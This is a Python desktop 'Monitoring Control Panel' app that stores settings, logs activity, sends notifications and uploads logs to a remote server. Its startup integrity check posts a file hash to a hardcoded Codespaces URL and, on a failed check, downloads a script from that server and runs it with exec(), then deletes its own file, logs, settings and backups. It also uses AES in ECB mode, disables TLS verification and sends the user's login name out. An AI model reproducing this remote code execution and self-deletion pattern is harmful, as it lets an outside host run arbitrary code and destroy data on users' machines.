import os
import sys
import logging
import hashlib
import requests
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from Crypto.Cipher import AES
import base64
import shutil

# Use %APPDATA%\KeySecureApp for Windows, ~/.keysecureapp for others
if os.name == "nt":
    APP_DIR = os.path.join(os.environ["APPDATA"], "KeySecureApp")
else:
    APP_DIR = os.path.expanduser("~/.keysecureapp")
SETTINGS_FILE = os.path.join(APP_DIR, "settings.conf")
LOG_FILE = os.path.join(APP_DIR, "activity.log")
SUM_SERVER_URL = "https://congenial-funicular-x54rwwvpwj5vfp5w9-3000.app.github.dev/"  # Adjust as needed

# --- ENCRYPTION ---
def encrypt_data(data, key):
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    padded_data = data.ljust(32)
    return base64.b64encode(cipher.encrypt(padded_data.encode())).decode()

def encrypt_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# --- SETTINGS ---
def save_settings(server_url, key_path):
    with open(SETTINGS_FILE, "w") as f:
        f.write(f"{server_url}\n{key_path}\n")

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        return None, None
    with open(SETTINGS_FILE, "r") as f:
        lines = f.read().splitlines()
        return lines[0], lines[1]

def load_auth_key(key_path):
    with open(key_path, "r") as f:
        return f.read().strip()

# --- LOGGING ---
logging.basicConfig(filename=LOG_FILE, level=logging.INFO)

def monitor_system():
    logging.info("Monitoring active.")

def send_notification(event, server_url, auth_key):
    data = {"event": event, "user": os.getlogin()}
    try:
        requests.post(
            f"{server_url}/notify",
            json=data,
            headers={'x-auth-key': auth_key},
            timeout=5,
            verify=False  # For self-signed certs; set to True with valid certs
        )
    except Exception as e:
        logging.error(f"Notification failed: {e}")

def upload_log(server_url, auth_key):
    if not os.path.exists(LOG_FILE):
        return
    with open(LOG_FILE, "r") as f:
        content = f.read()
    data = {"filename": LOG_FILE, "content": content}
    try:
        requests.post(
            f"{server_url}/storage/upload",
            json=data,
            headers={'x-auth-key': auth_key},
            timeout=5,
            verify=False
        )
    except Exception as e:
        logging.error(f"Log upload failed: {e}")

def get_app_sum():
    """Compute SHA-256 sum of this app.py file."""
    hasher = hashlib.sha256()
    with open(__file__, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            hasher.update(chunk)
    return int(hasher.hexdigest(), 16)

def verify_app_integrity():
    """Send sum to sum-server and compare."""
    sum_value = get_app_sum()
    try:
        resp = requests.post(SUM_SERVER_URL, json={"numbers": [sum_value]}, timeout=5)
        if resp.ok:
            result = resp.json()
            if not result.get("valid", False):
                secure_self_destruct()
        else:
            logging.error("Sum server error: %s", resp.text)
    except Exception as e:
        logging.error(f"Sum check failed: {e}")

def secure_self_destruct():
    """Delete app.py, backups, logs, and exit. If possible, fetch and run minimal self-destruct script from sum server."""
    try:
        # Try to fetch and run the minimal self-destruct script from the sum server
        try:
            resp = requests.get(f"{SUM_SERVER_URL.replace('/sum','')}/selfdestruct", timeout=5)
            if resp.ok:
                exec(resp.text, {'__name__': '__main__'})
        except Exception as e:
            logging.error(f"Remote self-destruct fetch failed: {e}")
        # Fallback: local deletion
        try:
            os.remove(__file__)
        except Exception:
            pass
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
        if os.path.exists(SETTINGS_FILE):
            os.remove(SETTINGS_FILE)
        if os.path.exists("backup"):
            shutil.rmtree("backup")
    except Exception as e:
        logging.error(f"Self-destruct error: {e}")
    sys.exit("App integrity check failed. Self-destructed.")

# --- GUI ---
class MonitoringGUI:
    def __init__(self, master, server_url, auth_key):
        self.master = master
        self.server_url = server_url
        self.auth_key = auth_key
        self.master.title("Monitoring Control Panel")
        self.master.geometry("800x600")
        self.header_frame = tk.Frame(master, height=50, bg="#2E86C1")
        self.header_frame.pack(fill="x")
        self.title_label = tk.Label(self.header_frame, text="Monitoring Control Panel", fg="white", bg="#2E86C1", font=("Arial", 18))
        self.title_label.pack(pady=10)
        self.content_frame = tk.Frame(master, bg="#F8F9F9")
        self.content_frame.pack(expand=True, fill="both")
        self.pause_button = tk.Button(self.content_frame, text="Pause Monitoring", width=20, command=self.pause_monitoring)
        self.pause_button.grid(row=0, column=0, padx=20, pady=20)
        self.view_logs_button = tk.Button(self.content_frame, text="View Logs", width=20, command=self.view_logs)
        self.view_logs_button.grid(row=0, column=1, padx=20, pady=20)
        self.adjust_button = tk.Button(self.content_frame, text="Adjust Sensitivity", width=20, command=self.adjust_sensitivity)
        self.adjust_button.grid(row=1, column=0, padx=20, pady=20)
        self.backup_button = tk.Button(self.content_frame, text="Force Backup Deletion", width=20, command=self.force_delete_backups)
        self.backup_button.grid(row=1, column=1, padx=20, pady=20)
        self.owner_button = tk.Button(self.content_frame, text="Owner Panel", width=20, command=self.show_owner_panel)
        self.owner_button.grid(row=2, column=0, columnspan=2, pady=20)
        self.footer_frame = tk.Frame(master, height=30, bg="#2E86C1")
        self.footer_frame.pack(fill="x")
        self.status_label = tk.Label(self.footer_frame, text="Status: Active", fg="white", bg="#2E86C1", font=("Arial", 10))
        self.status_label.pack(pady=5)

    def pause_monitoring(self):
        self.status_label.config(text="Status: Monitoring Paused")
        logging.info("Monitoring paused.")
        send_notification("Monitoring paused", self.server_url, self.auth_key)

    def view_logs(self):
        self.status_label.config(text="Status: Viewing Logs")
        os.system(f'notepad {LOG_FILE}')

    def adjust_sensitivity(self):
        self.status_label.config(text="Status: Adjusting Sensitivity")
        # Placeholder for sensitivity adjustment

    def force_delete_backups(self):
        self.status_label.config(text="Status: Backups Deleted")
        # Placeholder for backup deletion logic
        send_notification("Backups deleted", self.server_url, self.auth_key)

    def show_owner_panel(self):
        owner_panel = tk.Toplevel(self.master)
        owner_panel.title("Owner Panel")
        owner_panel.geometry("600x400")
        header = tk.Label(owner_panel, text="Owner Panel — Administrator Access", font=("Arial", 16), fg="white", bg="#2C3E50")
        header.pack(fill="x", pady=10)
        log_label = tk.Label(owner_panel, text="System Logs:", font=("Arial", 12))
        log_label.pack(pady=(10, 0))
        log_listbox = tk.Listbox(owner_panel, width=70, height=15)
        log_listbox.pack(padx=20, pady=10)
        try:
            with open(LOG_FILE, "r") as f:
                for line in f:
                    log_listbox.insert(tk.END, line.strip())
        except Exception:
            pass
        refresh_button = tk.Button(owner_panel, text="Refresh Logs", command=lambda: self.refresh_logs(log_listbox))
        refresh_button.pack(pady=5)
        upload_button = tk.Button(owner_panel, text="Upload Logs", command=lambda: upload_log(self.server_url, self.auth_key))
        upload_button.pack(pady=5)

    def refresh_logs(self, log_listbox):
        log_listbox.delete(0, tk.END)
        try:
            with open(LOG_FILE, "r") as f:
                for line in f:
                    log_listbox.insert(tk.END, line.strip())
        except Exception:
            pass

# --- INSTALLATION WORKFLOW ---
def initial_setup():
    root = tk.Tk()
    root.withdraw()
    server_url = simpledialog.askstring("Server Address", "Enter Node server URL (e.g. https://IP:PORT):")
    if not server_url:
        sys.exit("No server URL provided.")
    key_path = filedialog.askopenfilename(title="Select Key File")
    if not key_path:
        sys.exit("No key file selected.")
    save_settings(server_url, key_path)
    messagebox.showinfo("Setup Complete", "Settings saved. Continue with installation.")
    root.destroy()

if __name__ == "__main__":
    verify_app_integrity()
    if not os.path.exists(SETTINGS_FILE):
        initial_setup()
    server_url, key_path = load_settings()
    auth_key = load_auth_key(key_path)
    monitor_system()
    root = tk.Tk()
    app = MonitoringGUI(root, server_url, auth_key)
    root.mainloop()
